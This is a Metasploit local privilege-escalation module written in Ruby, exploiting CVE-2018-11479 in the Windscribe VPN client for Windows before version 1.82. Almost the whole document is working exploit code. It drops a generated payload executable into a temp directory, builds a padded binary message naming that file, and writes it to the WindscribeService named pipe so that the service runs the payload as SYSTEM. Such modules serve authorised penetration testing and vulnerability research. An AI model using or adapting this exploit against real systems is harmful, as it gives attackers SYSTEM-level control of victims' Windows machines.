# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::EXE
  include Post::File
  include Post::Windows::Priv
  include Post::Windows::Services
  include Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Windscribe WindscribeService Named Pipe Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        The Windscribe VPN client application for Windows makes use of a
        Windows service `WindscribeService.exe` which exposes a named pipe
        `\\.\pipe\WindscribeService` allowing execution of programs with
        elevated privileges.

        Windscribe versions prior to 1.82 do not validate user-supplied
        program names, allowing execution of arbitrary commands as SYSTEM.

        This module has been tested successfully on Windscribe versions
        1.80 and 1.81 on Windows 7 SP1 (x64).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
      [
        &#039;Emin Ghuliev&#039;, # Discovery and exploit
        &#039;bcoles&#039;        # Metasploit
      ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2018-11479&#039;],
          [&#039;URL&#039;, &#039;http://blog.emingh.com/2018/05/windscribe-vpn-privilege-escalation.html&#039;],
          [&#039;URL&#039;, &#039;https://pastebin.com/eLG3dpYK&#039;]
        ],
      &#039;Platform&#039;       => [&#039;win&#039;],
      &#039;Targets&#039;        => [[&#039;Automatic&#039;, {}]],
      &#039;DisclosureDate&#039; => &#039;2018-05-24&#039;,
      &#039;DefaultOptions&#039; =>
        {
        },
      &#039;Notes&#039;          =>
        {
          &#039;Reliability&#039; => [ REPEATABLE_SESSION ],
          &#039;Stability&#039;   => [ CRASH_SAFE ]
        },
      &#039;DefaultTarget&#039;  => 0))
    register_advanced_options [
      OptString.new(&#039;WritableDir&#039;, [false, &#039;A directory where we can write files (%TEMP% by default)&#039;, nil]),
    ]
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].blank? ? session.sys.config.getenv(&#039;TEMP&#039;) : datastore[&#039;WritableDir&#039;].to_s
  end

  def service_exists?(service)
    srv_info = service_info(service)

    if srv_info.nil?
      vprint_warning &#039;Unable to enumerate Windows services&#039;
      return false
    end

    if srv_info && srv_info[:display].empty?
      return false
    end

    true
  end

  def write_named_pipe(pipe, command)
    kt = "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    kt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    kt << "\x00\x00\x00\x00"
    kt << [command.force_encoding(&#039;UTF-8&#039;).codepoints.map { |c| "%04X" % c }.join].pack(&#039;H*&#039;)
    kt << "\x00" * (32_005 - kt.length)

    print_status "Sending #{command} to #{pipe} ..."

    r = session.railgun.kernel32.CreateFileA(pipe, &#039;GENERIC_READ | GENERIC_WRITE&#039;, 0, nil, &#039;OPEN_EXISTING&#039;, 0, nil)
    handle = r[&#039;return&#039;]

    if handle == 0xffffffff # INVALID_HANDLE_VALUE
      print_error "Invalid handle. #{pipe} named pipe not found, or already opened"
      return false
    end

    vprint_good("Opended #{pipe}! Proceeding ...")

    begin
      w = client.railgun.kernel32.WriteFile(handle, kt, kt.length, 4, nil)
      if w[&#039;return&#039;] == false
        return false
      end
    ensure
      session.railgun.kernel32.CloseHandle(handle)
    end

    true
  rescue
    false
  end

  def check
    service = &#039;WindscribeService&#039;

    unless service_exists? service
      return CheckCode::Safe("Service &#039;#{service}&#039; does not exist")
    end

    CheckCode::Detected
  end

  def exploit
    unless check == CheckCode::Detected
      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable&#039;
    end

    if is_system?
      fail_with Failure::BadConfig, &#039;Session already has SYSTEM privileges&#039;
    end

    payload_path = "#{base_dir}\\#{Rex::Text.rand_text_alphanumeric(8..10)}.exe"
    payload_exe = generate_payload_exe
    vprint_status "Writing payload (#{payload.encoded.length} bytes) to #{payload_path} ..."
    write_file payload_path, payload_exe
    register_file_for_cleanup payload_path

    unless write_named_pipe("\\\\.\\pipe\\WindscribeService", payload_path)
      fail_with Failure::Unknown, &#039;Failed to write to pipe&#039;
    end
  end
end

